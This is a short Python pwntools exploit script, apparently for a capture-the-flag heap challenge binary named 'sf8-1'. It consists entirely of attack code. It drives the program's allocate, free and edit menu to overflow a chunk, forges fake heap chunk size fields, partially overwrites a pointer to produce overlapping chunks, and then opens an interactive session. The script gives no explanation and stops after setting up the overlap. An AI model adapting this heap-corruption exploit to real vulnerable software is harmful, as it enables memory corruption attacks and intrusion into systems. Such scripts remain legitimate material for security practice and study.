from pwn import*
p = process('./sf8-1')

p.sendline('1')
p.sendline('16')

p.sendline('1')
p.sendline('16')

p.sendline('1')
p.sendline('16')

p.sendline('1')
p.sendline('128')

p.sendline('1')
p.sendline('16')

p.sendline('3')
p.sendline('1')

p.sendline('3')
p.sendline('2')

p.sendline('2')
p.sendline('0')
pay = ''
pay += p64(0)*3+p64(0x21)
pay += p64(0)*3+p64(0x21)
pay += p8(0x60)
p.sendline(str(len(pay)))
p.send(pay)

p.sendline('1')
p.sendline('16')


p.sendline('2')
p.sendline('0')

pay = ''
pay += p64(0)*3+p64(0x21)
pay += p64(0)*3+p64(0x21)
pay += p64(0)*3+p64(0x21)	# change
p.sendline(str(len(pay)))
p.send(pay)

p.sendline('1')
p.sendline('16')	# index 2 = index 3


p.sendline('2')
p.sendline('0')
pay = ''
pay += p64(0)*3+p64(0x21)
pay += p64(0)*3+p64(0x21)
pay += p64(0)*3+p64(0x91)	# change
p.sendline(str(len(pay)))
p.send(pay)

p.recv()

p.interactive()
